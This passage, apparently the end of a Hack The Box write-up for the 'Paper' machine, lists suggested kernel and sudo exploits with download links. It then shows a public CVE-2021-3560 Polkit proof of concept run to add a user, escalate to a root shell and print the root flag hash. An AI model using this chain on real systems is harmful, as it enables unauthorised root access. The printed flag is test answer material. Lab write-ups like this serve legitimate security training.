+</span><span class="z-text z-plain">   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
+</span><span class="z-text z-plain">   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] [CVE-2022-2586] nft_object UAF
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
+</span><span class="z-text z-plain">   Exposure: less probable
+</span><span class="z-text z-plain">   Tags: ubuntu=(20.04){kernel:5.12.13}
+</span><span class="z-text z-plain">   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
+</span><span class="z-text z-plain">   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] [CVE-2021-4034] PwnKit
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+</span><span class="z-text z-plain">   Exposure: less probable
+</span><span class="z-text z-plain">   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
+</span><span class="z-text z-plain">   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] [CVE-2021-3156] sudo Baron Samedit
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+</span><span class="z-text z-plain">   Exposure: less probable
+</span><span class="z-text z-plain">   Tags: mint=19,ubuntu=18|20, debian=10
+</span><span class="z-text z-plain">   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] [CVE-2021-3156] sudo Baron Samedit 2
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+</span><span class="z-text z-plain">   Exposure: less probable
+</span><span class="z-text z-plain">   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
+</span><span class="z-text z-plain">   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+</span><span class="z-text z-plain">   Exposure: less probable
+</span><span class="z-text z-plain">   Tags: ubuntu=20.04{kernel:5.8.0-*}
+</span><span class="z-text z-plain">   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+</span><span class="z-text z-plain">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+</span><span class="z-text z-plain">   Comments: ip_tables kernel module must be loaded
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] [CVE-2019-18634] sudo pwfeedback
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
+</span><span class="z-text z-plain">   Exposure: less probable
+</span><span class="z-text z-plain">   Tags: mint=19
+</span><span class="z-text z-plain">   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
+</span><span class="z-text z-plain">   Comments: sudo configuration requires pwfeedback to be enabled.
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] [CVE-2019-15666] XFRM_UAF
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
+</span><span class="z-text z-plain">   Exposure: less probable
+</span><span class="z-text z-plain">   Download URL: 
+</span><span class="z-text z-plain">   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] [CVE-2019-13272] PTRACE_TRACEME
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
+</span><span class="z-text z-plain">   Exposure: less probable
+</span><span class="z-text z-plain">   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},debian=10{kernel:4.19.0-*},fedora=30{kernel:5.0.9-*}
+</span><span class="z-text z-plain">   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
+</span><span class="z-text z-plain">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
+</span><span class="z-text z-plain">   Comments: Requires an active PolKit agent.
+</span></code></pre>
+<p>It finds a few potential exploits, but their exposure are all categorized as 'less probable'.</p>
+<p>Unfortunately, none of them work.</p>
+<h2 id="linpeas">Linpeas</h2>
+<p>Time to run <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a> to enumerate this box more deeply.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ /tmp/linpeas.sh</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">╔══════════╣ Sudo version
+</span><span class="z-text z-plain">╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+</span><span class="z-text z-plain">Sudo version 1.8.29
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Vulnerable to CVE-2021-3560
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>So <code>linpeas</code> reports many things that we already found by manually enumerating the box, but it found that Paper was vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3560">CVE-2021-3560</a>.</p>
+<p>Note that at the moment of writing this CVE is not detected on new versions of <code>linpeas</code>, so you have to use an old one to find it, as mentioned in <a href="https://github.com/carlospolop/PEASS-ng/issues/339">this GitHub issue</a>. I used <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20220213">this version</a>.</p>
+<h1 id="privilege-escalation-cve-2021-3560">Privilege escalation (<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3560">CVE-2021-3560</a>)</h1>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3560">CVE-2021-3560</a> is a vulnerability in Polkit, a system authorization framework that allows applications to ask for permission to perform actions that require elevated privileges, mainly used on Linux. The vulnerability lies in Polkit's handling of D-Bus requests, a message bus system that allows applications to communicate with each other. When an application makes a D-Bus request to Polkit, Polkit checks the requester's credentials to determine whether they have the necessary permissions. But in the case of <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3560">CVE-2021-3560</a>, Polkit can be tricked into bypassing the credential checks for D-Bus requests. This can be done by creating a malicious D-Bus request that appeared to come from a trusted application, such as the user's desktop environment, therefore gaining <code>root</code> privileges on the target system.</p>
+<h2 id="preparation">Preparation</h2>
+<p>If we search online for a PoC, we find a <a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation">GitHub repository</a> created by the author of Paper. What a coincidence!</p>
+<p>Let's download it to our machine and transfer it on Paper.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>This script creates a new user, by default named <code>secnigma</code> with password <code>secnigmaftw</code>. I'd prefer to create a username with my own name, and thankfully this script takes optional flags to change that!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ /tmp/poc.sh<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>mmezirard<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>mmezirard</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">[!] Username set as : mmezirard
+</span><span class="z-text z-plain">[!] No Custom Timing specified.
+</span><span class="z-text z-plain">[!] Timing will be detected Automatically
+</span><span class="z-text z-plain">[!] Force flag not set.
+</span><span class="z-text z-plain">[!] Vulnerability checking is ENABLED!
+</span><span class="z-text z-plain">[!] Starting Vulnerability Checks...
+</span><span class="z-text z-plain">[!] Checking distribution...
+</span><span class="z-text z-plain">[!] Detected Linux distribution as &quot;centos&quot;
+</span><span class="z-text z-plain">[!] Checking if Accountsservice and Gnome-Control-Center is installed
+</span><span class="z-text z-plain">[+] Accounts service and Gnome-Control-Center Installation Found!!
+</span><span class="z-text z-plain">[!] Checking if polkit version is vulnerable
+</span><span class="z-text z-plain">[+] Polkit version appears to be vulnerable!!
+</span><span class="z-text z-plain">[!] Starting exploit...
+</span><span class="z-text z-plain">[!] Inserting Username mmezirard...
+</span><span class="z-text z-plain">Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+</span><span class="z-text z-plain">[+] Inserted Username mmezirard  with UID 1005!
+</span><span class="z-text z-plain">[!] Inserting password hash...
+</span><span class="z-text z-plain">[!] It looks like the password insertion was succesful!
+</span><span class="z-text z-plain">[!] Try to login as the injected user using su - mmezirard
+</span><span class="z-text z-plain">[!] When prompted for password, enter your password 
+</span><span class="z-text z-plain">[!] If the username is inserted, but the login fails; try running the exploit again.
+</span><span class="z-text z-plain">[!] If the login was succesful,simply enter &#39;sudo bash&#39; and drop into a root shell!
+</span></code></pre>
+<p>It didn't work the first runs, but this script warns us that this is totally normal, so I simply ran it again until it worked.</p>
+<p>Now it gives us the steps required to get <code>root</code>!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> tmp]$ su - mmezirard</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Password:
+</span><span class="z-text z-plain">[mmezirard@paper ~]$
+</span></code></pre>
+<p>Now we simply have to run <code>sudo bash</code> to drop into a <code>root</code> shell!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[mmezirard@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ sudo bash</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[sudo] password for mmezirard: 
+</span><span class="z-text z-plain">[root@paper mmezirard]#
+</span></code></pre>
+<p>Let's confirm that we are <code>root</code>:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[root@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> mmezirard]# whoami</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">root
+</span></code></pre>
+<p>Nice!</p>
+<h1 id="local-enumeration-1">Local enumeration</h1>
+<h2 id="home-folder-1">Home folder</h2>
+<p>The only thing we need to do to finish this box is to retrieve the root flag. As usual, we can find it in <code>/root</code>!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[root@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> mmezirard]# cat /root/root.txt</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">f46c0b5c994a22597d23f3f797225645
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/success.png" alt="Success" /></p>
+<p>That's it for this box! I found the foothold really long, this is definitely the longest I've done so far. It was not overly complicated to exploit though. The privilege escalation was really hard to find, becuase as I mentioned in this write-up the latest versions of <code>linpeas</code> don't find the CVE to get <code>root</code>, so I had to look it up online. The exploit also required several runs to properly work, which was annoying.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
